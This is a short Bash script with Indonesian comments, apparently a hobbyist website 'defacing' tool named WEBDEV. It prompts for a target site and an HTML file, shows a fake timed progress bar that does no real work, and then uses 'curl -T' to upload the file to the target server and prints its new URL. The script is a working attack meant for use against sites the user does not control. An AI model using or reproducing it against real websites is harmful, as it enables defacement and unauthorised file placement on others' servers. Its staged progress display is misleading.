#!/usr/bash
#open source code
#code by Mr.1557
#Di buat tanggal : 19 September 2021 23.00
#Github : https://github.com/Aldi098
#Youtube : Mr.1557
#Jangan ambil sc orang mulu ok^_^
#jika ada kesalahan mohon maaf soalnya saya juga lagi belajar

toilet -f future "WEBDEV" | lolcat
echo -e "-------------------------------------------" | lolcat
echo -e "Webdev versi 01" | lolcat
echo -e "Code : By MR.1557" | lolcat
echo -e "-------------------------------------------" | lolcat
echo -e "Note : Masukan Web target" | lolcat
read -p "Web : " target
echo -e "Note : Masukan Script html" | lolcat
read -p "Script : " script
echo
echo -e "Sedang di peroses...." | lolcat
echo
sleep 2
echo -e "10%" | lolcat
sleep 1 
echo -e " 20%" | lolcat
sleep 1
echo -e "  30%" | lolcat
sleep 1
echo -e "   40%" | lolcat
sleep 1
echo -e "    50%" | lolcat
sleep 1
echo -e "     60%" | lolcat
sleep 1
echo -e "       70%" | lolcat
sleep 1
echo -e "        80%" | lolcat
sleep 1
echo -e "         90%" | lolcat
sleep 1
echo -e "          100%" | lolcat
sleep 3
echo -e
curl -T /storage/emulated/0/$script $target
echo -e "[+]===＞$target/$script"
#selamat belajar bro ^_^